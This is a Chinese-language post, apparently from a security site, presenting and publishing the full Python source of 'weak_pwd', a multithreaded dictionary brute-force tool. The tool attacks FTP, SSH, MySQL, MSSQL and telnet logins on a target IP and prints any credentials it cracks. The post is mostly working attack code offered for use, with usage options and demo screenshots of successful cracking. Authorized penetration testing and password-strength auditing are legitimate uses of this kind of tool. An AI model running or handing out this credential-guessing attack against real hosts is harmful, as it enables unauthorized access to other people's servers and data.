### 常见服务弱口令爆破脚本（weak_pwd）

### 目录结构

### pip安装以下模块

    
    
    pymysql
    paramiko
    pymssql
    colorama
    ftplib
    telnetlib
    argparse
    

### 选项

    
    
    -h,   HELP,      --help           帮助菜单
      -s   SERVER,    --server    要爆破的服务
      -u   USER,      --user      用户名字典（不加参数默认用户名字典）
      -c   CIPHER,    --cipher    密码字典（不加参数默认密码字典）
      -t   THREADS,   --threads   线程数（默认2线程）
      -i   IP,        --ip        目标主机地址（xxx.xxx.xxx.xxx)
      -p   PORT,      --port      目标端口（0-65535，默认各服务端口）
    

### 支持

    
    
    ftp，ssh，mysql，mssql
    

### 效果

演示 mysql弱口令爆破）  
端口关闭会提示关闭  
![image.png](https://image.3001.net/images/20211113/1636819053_618fe06d43dc4dbbd3246.png!small)  
服务开启时，会一直爆破，直到爆破成功。  
![image.png](https://image.3001.net/images/20211114/1636819204_618fe1041e95d2c169cf8.png!small)密码正确会自动退出

### weak_pwd源码

    
    
    import pymysql
    import pymssql
    import ftplib
    import paramiko
    import telnetlib
    import threading
    import time
    import queue
    import sys
    import argparse
    import socket
    import colorama
    from colorama import init,Fore,Back,Style
    init(autoreset=True)
    def banner():
        print('\033[1;35m''+-------------------------------+')
        print('\033[1;35m''|  author : lemonlove7          |')
        print('\033[1;35m''|  help : python xxx.py -h      |')
        print('\033[1;35m''|  support:                     |')
        print('\033[1;35m''|   ssh,mysql,mssql,ftp,telnet  |')
        print('\033[1;35m''+-------------------------------+')
    
    def open_port(ip,port):
        time_out=0.1
        scan_socket = socket.socket()
        scan_socket.settimeout(time_out)
        if scan_socket.connect_ex((ip, int(port))) == 0:
            return True
        else:
            return False
    
    def mysql_brute(ip,port):
        while not q.empty():
            dict = q.get()
            dict = dict.split('|')
            username = dict[0]
            password = dict[1]
            try:
                mysql = pymysql.connect(host=ip, port=int(port), user=username, passwd=password, db='mysql')
                login.append('正确 [+] mysql host：' + ip + ' user：' + username + ' password：' + password)
                mysql.close()
                while not q.empty():
                    q.get()
            except:
                print('\033[1;36m''错误 [-] mysql host：' + ip + ' user：' + username + ' password：' + password+'\n',end='\r')
    
    def ftp_brute(ip,port):
        while not q.empty():
            dict=q.get()
            dict=dict.split('|')
            username=dict[0]
            password=dict[1]
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, int(port),2)
                ftp.login(username,password)
                ftp.quit()
                login.append('正确 [+] ftp host：' + ip + ' user：' + username + ' password：' + password)
    
                while not q.empty():
                    q.get()
            except:
                print('\033[1;36m''错误 [-] ftp host：' + ip + ' user：' + username + ' password：' + password+'\n',end='\r')
    
    def ssh_brute(ip,port):
        while not q.empty():
            dict = q.get()
            dict = dict.split('|')
            username = dict[0]
            password = dict[1]
            try:
                transport = paramiko.Transport((ip, int(port)))
                transport.banner_timeout = 30
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=ip, port=int(port), username=username, password=password)
                ssh.close()
                login.append('正确 [+] ssh host：' + ip + ' user：' + username + ' password：' + password)
                while not q.empty():
                    q.get()
            except:
                print('\033[1;36m''错误 [-] ssh host：' + ip + ' user：' + username + ' password：' + password + '\n', end='\r')
    
    def mssql_brute(ip,port):
        while not q.empty():
            dict = q.get()
            dict = dict.split('|')
            username = dict[0]
            password = dict[1]
            try:
                db = pymssql.connect(ip,username,password,port=int(port))
                db.close()
                login.append('正确 [+] mssql host：' + ip + ' user：' + username + ' password：' + password)
                while not q.empty():
                    q.get()
            except:
                print('\033[1;36m''错误 [-] mssql host：' + ip + ' user：' + username + ' password：' + password + '\n', end='\r')
    
    def telnet_brute(ip,port):
        while not q.empty():
            dict = q.get()
            dict = dict.split('|')
            username = dict[0]
            password = dict[1]
            try:
                tn=telnetlib.Telnet(ip,port=int(port),timeout=1)
                tn.read_until(b'login: ')
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b'Password: ')
                tn.write(password.encode('ascii') + b"\n")
                time.sleep(5)
                command_result = tn.read_very_eager().decode('ascii')
                tn.close()
                if 'Login' not in command_result:
                    login.append('正确 [+] telnet host：' + ip + ' user：' + username + ' password：' + password)
                    while not q.empty():
                        q.get()
                else:
                    print('\033[1;36m''错误 [-] telnet host：' + ip + ' user：' + username + ' password：' + password + '\n', end='\r')
            except:
                print('\033[1;36m''错误 [-] telnet host：' + ip + ' user：' + username + ' password：' + password + '\n', end='\r')
    
    def run(threads,server):
        thread_list = []
        for x in range(int(threads)):
            t = threading.Thread(target=server,args=(ip,port))
            thread_list.append(t)
    
        for t in thread_list:
            t.setDaemon(True)
            t.start()
    
        for t in thread_list:
            t.join()
    
        time.sleep(2)
        if login==[]:
            print('\033[1;33m''爆破结束，没有爆破成功')
        else:
            for i in login:
                print(f'\033[1;31m{i}')
    
    if __name__ == '__main__':
        if len(sys.argv) == 1:
            banner()
            sys.exit()
    
        parser = argparse.ArgumentParser(description='scan help')
        parser.add_argument('-s', '--server', help='select server!', default='')
        parser.add_argument('-u', '--user', help='username Dictionaries!', default='')
        parser.add_argument('-c', '--cipher', help='cipher Dictionaries!', default='')
        parser.add_argument('-t', '--threads', help='many threads!', default='')
        parser.add_argument('-i', '--ip', help='target ip!', default='')
        parser.add_argument('-p', '--port', help='target port!', default='')
        args = parser.parse_args()
        server = args.server
        user=args.user
        cipher=args.cipher
        threads=args.threads
        ip=args.ip
        port=args.port
    
        if user =='':
            user='user.txt'
        if cipher =='':
            cipher='passwd.txt'
        if threads =='':
            threads='2'
        if port== '':
            if server =='mysql':
                port='3306'
            if server=='ftp':
                port='21'
            if server=='ssh':
                port='22'
            if server=='mssql':
                port='1433'
            if server =='telnet':
                port='23'
    
        start_open=open_port(ip=ip,port=port)
        if start_open==True:
            login=[]
            q = queue.Queue()
            for username in open(user,encoding="UTF-8"):
                for password in open(cipher,encoding="UTF-8"):
                    username = username.replace('\n', '')
                    password = password.replace('\n', '')
                    zidian = username + '|' + password
                    q.put(zidian)
            if server =='mysql':
                run(threads=threads,server=mysql_brute)
            if server =='ftp':
                run(threads=threads,server=ftp_brute)
            if server =='ssh':
                run(threads=threads,server=ssh_brute)
    

